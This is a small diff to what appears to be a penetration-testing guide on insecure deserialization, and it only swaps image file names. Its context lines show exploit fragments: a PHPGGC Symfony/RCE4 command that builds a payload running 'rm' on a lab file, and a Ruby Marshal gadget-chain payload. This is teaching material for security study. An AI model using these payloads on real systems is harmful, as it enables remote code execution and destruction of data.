@@ -588,7 +588,7 @@ PHP Example Using PHPGGC:
 phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```php
 <?php
@@ -698,7 +698,7 @@ payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
 puts Base64.encode64(payload) 
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Create Your Own Gadget Chain Exploit
 
